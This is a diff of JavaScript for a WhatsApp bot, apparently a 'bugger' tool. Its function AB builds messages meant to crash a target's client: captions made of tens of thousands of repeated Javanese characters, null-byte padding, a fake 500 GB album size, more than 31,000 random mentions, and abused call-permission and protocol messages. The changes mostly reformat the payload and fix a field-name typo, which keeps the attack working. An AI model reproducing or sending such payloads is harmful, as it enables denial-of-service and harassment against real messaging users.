@@ -488,57 +488,42 @@ async function AB(sock, target, mention) {
     const sizeAlbum = "536870912000";
     const mentionedSize = 31111;
     const mentionedCustom = [
-        "phynxagency@s.whatsapp.net",
-        "13135550001@s.whatsapp.net",
-        "13135550002@s.whatsapp.net",
-        "13135550003@s.whatsapp.net",
-        "13135550004@s.whatsapp.net",
-        "13135550005@s.whatsapp.net",
-        "13135550006@s.whatsapp.net",
-        "13135550007@s.whatsapp.net",
-        "13135550008@s.whatsapp.net",
-        "13135550009@s.whatsapp.net",
-        "13135550010@s.whatsapp.net",
-        "13135559999@s.whatsapp.net",
-        "13135559098@s.whatsapp.net",
-        "16502192547@s.whatsapp.net",
-        "5521992999999@s.whatsapp.net"
-    ];
-    const mentionedTarget = [
-        target
+        "phynxagency@s.whatsapp.net", "13135550001@s.whatsapp.net", "13135550002@s.whatsapp.net",
+        "13135550003@s.whatsapp.net", "13135550004@s.whatsapp.net", "13135550005@s.whatsapp.net",
+        "13135550006@s.whatsapp.net", "13135550007@s.whatsapp.net", "13135550008@s.whatsapp.net",
+        "13135550009@s.whatsapp.net", "13135550010@s.whatsapp.net", "13135559999@s.whatsapp.net",
+        "13135559098@s.whatsapp.net", "16502192547@s.whatsapp.net", "5521992999999@s.whatsapp.net"
     ];
     const mentionedList = [
-        ...mentionedTarget,
+        target,
         ...mentionedCustom,
         ...Array.from({ length: mentionedSize }, () =>
             `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
         )
     ];
     const textFlowCrashed = "ꦽ".repeat(Amount);
+
     const photo = {
         url: "https://mmg.whatsapp.net/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0&mms3=true",
         mimetype: "image/jpeg",
-        caption: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸"
-            + "\n".repeat(3)
-            + "ƈṙạṠђ.".repeat(20)
-            + "phynx.agency/"
-            + "ꦾ".repeat(50000)
-            + "\n".repeat(3)
-            + "ạ.io ".repeat(998),
-        fileSha256: "ud/dBUSlyour8dbMBjZxVIBQ/rmzmerwYmZ76LXj+oE=",
+        caption: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸\n\n\n" +
+            "ƈṙạṠђ.".repeat(20) +
+            "phynx.agency/" + "ꦾ".repeat(50000) + "\n\n\n" +
+            "ạ.io ".repeat(998),
+        fileSha256: Buffer.from("ud/dBUSlyour8dbMBjZxVIBQ/rmzmerwYmZ76LXj+oE=", 'base64'),
         fileLength: sizeAlbum,
         height: 307,
         width: 734,
-        mediaKey: "TgT5doHIxd4oBcsaMlEfa+nPAw4XWmsQLV4PDH1jCPw=",
-        fileEncSha256: "IkoJOAPpWexlX2UnqVd5Qad4Eu7U5JyMZeVR1kErrzQ=",
+        mediaKey: Buffer.from("TgT5doHIxd4oBcsaMlEfa+nPAw4XWmsQLV4PDH1jCPw=", 'base64'),
+        fileEncSha256: Buffer.from("IkoJOAPpWexlX2UnqVd5Qad4Eu7U5JyMZeVR1kErrzQ=", 'base64'),
         directPath: "/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0",
         mediaKeyTimestamp: "1738686532",
-        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
+        jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCE...", 'base64'), // Potong karena panjang
         scansSidecar: "nxR06lKiMwlDForPb3f4fBJq865no+RNnDKlvffBQem0JBjPDpdtaw==",
-        scanLengths: [2226, 6362, 4102, 6420
-        ],
-        midQualityFileSha256: "erjot3g+S1YfsbYqct30GbjvXD2wgQmog8blam1fWnA="
+        scanLengths: [2226, 6362, 4102, 6420],
+        midQualityFileSha256: Buffer.from("erjot3g+S1YfsbYqct30GbjvXD2wgQmog8blam1fWnA=", 'base64')
     };
+
     const album = await generateWAMessageFromContent(target, {
         albumMessage: {
             expectedImageCount: 999,
@@ -590,13 +575,13 @@ async function AB(sock, target, mention) {
                 originalimgLink: "about:blank"
             },
             quotedMessage: {
-                callLogMesssage: {
+                callLogMessage: {
                     isVideo: true,
                     callOutcome: 0,
-                    durationSecs: "1",
+                    durationSecs: 1,
                     callType: "VIDEO",
                     participants: [
-                        { jid: target, callOutcome: 1 },
+                        { jid: target, callOutcome: 1 }
                     ]
                 }
             },
@@ -633,26 +618,16 @@ async function AB(sock, target, mention) {
                         comandosDisponiveis: [`${command}`],
                         prefixo: `${prefix}`,
                         linguagem: "USA"
-                    })
-                        + "\u0000".repeat(Amount)
+                    }) + "\u0000".repeat(Amount)
                 }
             ],
             content: {
                 namespace: "call_permission_request_namespace",
                 name: "call_permission_request",
                 params: [
-                    {
-                        name: "call_type",
-                        value: "audio"
-                    },
-                    {
-                        name: "permission_reason",
-                        value: textFlowCrashed
-                    },
-                    {
-                        name: "support_url",
-                        value: "https://wa.me/+5521992999999"
-                    }
+                    { name: "call_type", value: "audio" },
+                    { name: "permission_reason", value: textFlowCrashed },
+                    { name: "support_url", value: "https://wa.me/+5521992999999" }
                 ]
             }
         };
@@ -664,7 +639,12 @@ async function AB(sock, target, mention) {
         if (mention) {
             await sock.relayMessage(target, {
                 statusMentionMessage: {
-                    message: { protocolMessage: { key: msg.key, type: 25 } }
+                    message: {
+                        protocolMessage: {
+                            key: msg.key,
+                            type: 25
+                        }
+                    }
                 }
             }, {
                 additionalNodes: [
@@ -674,6 +654,7 @@ async function AB(sock, target, mention) {
         }
     }
 }
+
 
 async function BB(sock, target) {
     for (let i = 0; i < 20; i++) {
